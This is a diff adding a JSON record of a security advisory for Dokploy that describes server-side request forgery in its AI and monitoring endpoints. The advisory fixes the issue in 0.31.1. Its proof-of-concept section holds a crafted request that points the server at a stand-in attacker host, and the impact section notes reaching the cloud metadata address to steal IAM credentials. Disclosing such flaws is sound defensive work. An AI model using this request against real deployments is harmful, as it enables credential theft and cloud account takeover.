@@ -1,0 +1,46 @@
+{
+  "global": null,
+  "id": "GHSA-cwhp-w8c5-2vjw",
+  "repo": {
+    "cve_id": null,
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": 7.7,
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N"
+      },
+      "cvss_v4": {
+        "score": null,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [
+      "CWE-918"
+    ],
+    "description": "### Summary\r\n\r\nMultiple tRPC procedures accept a user-supplied URL and make outbound HTTP requests from the Dokploy server without validating the URL scheme, host, or resolved IP address. Any authenticated member can probe internal network services and access cloud metadata endpoints. On AWS deployments with IMDSv1 enabled, this can lead to IAM credential theft.\r\n\r\n### Details\r\n\r\nThe following tRPC procedures are affected:\r\n\r\n**`ai.testConnection` and `ai.getModels`** at `apps/dokploy/server/api/routers/ai.ts:46-176`:\r\n\r\n```ts\r\ngetModels: protectedProcedure\r\n  .input(z.object({ apiUrl: z.string().min(1), apiKey: z.string() }))\r\n  .query(async ({ input }) => {\r\n    response = await fetch(`${input.apiUrl}/models`, { headers });\r\n  });\r\n```\r\n\r\nNo URL parsing, scheme allowlist, or private IP rejection is applied. `getProviderName` at `packages/server/src/utils/ai/select-ai-provider.ts:3` is a pure substring router with no security validation.\r\n\r\n**`server.getServerMetrics`** at `apps/dokploy/server/api/routers/server.ts:486`:\r\n\r\n```ts\r\nconst url = new URL(input.url);\r\nconst response = await fetch(url.toString(), {\r\n  headers: { Authorization: `Bearer ${input.token}` },\r\n});\r\n```\r\n\r\nThe `Authorization` header with the caller-supplied token is forwarded to the attacker-controlled URL.\r\n\r\n**`user.getContainerMetrics`** at `apps/dokploy/server/api/routers/user.ts:410` follows the same pattern.\r\n\r\nThese endpoints are protected by `protectedProcedure` or `withPermission(\"monitoring\", \"read\")`. The `monitoring` resource is in `enterpriseOnlyResources`, and the static-role early-return in `packages/server/src/services/permission.ts:85-90` bypasses the permission check for all default roles (owner, admin, member). Any default member can reach these endpoints.\r\n\r\n### PoC\r\n\r\n1. Create a default member account in a Dokploy organization.\r\n2. Start a listener on an attacker-controlled host: `python3 -m http.server 80`\r\n3. From the member session, send:\r\n\r\n```\r\nPOST /api/trpc/ai.testConnection?batch=1 HTTP/1.1\r\nHost: <target>:3000\r\nContent-Type: application/json\r\nCookie: better-auth.session_token=<member_session>\r\n\r\n{\"0\":{\"json\":{\"apiUrl\":\"http://<attacker_ip>\",\"apiKey\":\"\",\"model\":\"test\"}}}\r\n```\r\n\r\n4. Response: HTTP 400 with error message:\r\n```\r\n\"Failed after 3 attempts. Last error: Unsupported method ('POST')\"\r\n```\r\n\r\n5. The attacker's listener confirms three inbound POST requests from the Dokploy server.\r\n\r\n### Impact\r\n\r\nAny authenticated member can use the Dokploy server as an SSRF proxy to scan internal networks, access cloud metadata services (AWS IMDSv1 at 169.254.169.254), and exfiltrate responses. The monitoring endpoints additionally leak the caller-supplied bearer token to the attacker-controlled URL. On cloud deployments, this enables IAM credential theft and potential cloud account takeover.",
+    "ghsa_id": "GHSA-cwhp-w8c5-2vjw",
+    "html_url": "https://github.com/Dokploy/dokploy/security/advisories/GHSA-cwhp-w8c5-2vjw",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-cwhp-w8c5-2vjw"
+      }
+    ],
+    "published_at": "2026-11-12T08:17:36Z",
+    "references": [],
+    "severity": "high",
+    "summary": "Server-Side Request Forgery in AI and Monitoring Endpoints",
+    "updated_at": "2026-11-12T08:17:36Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "other",
+          "name": "dokploy"
+        },
+        "patched_versions": "0.31.1",
+        "vulnerable_version_range": "< 0.31.1"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "Dokploy/dokploy"
+}
